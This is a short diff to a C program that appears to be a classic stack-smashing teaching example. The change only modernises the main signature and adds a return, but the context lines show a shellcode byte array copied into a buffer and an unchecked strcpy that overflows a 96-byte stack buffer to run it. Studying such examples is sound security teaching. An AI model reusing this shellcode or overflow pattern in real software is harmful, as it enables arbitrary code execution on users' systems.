@@ -4,7 +4,7 @@ char short_shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07"
 
 char large_string[128];
 
-void main() {
+int main(void) {
 	char buffer[96];
 	int i;
 	long *long_ptr = (long *) large_string;
@@ -16,4 +16,5 @@ void main() {
 	for (i = 0; i < strlen(short_shellcode); i++)
 		large_string[i] = short_shellcode[i];
 	strcpy(buffer,large_string);
+	return 0;
 }
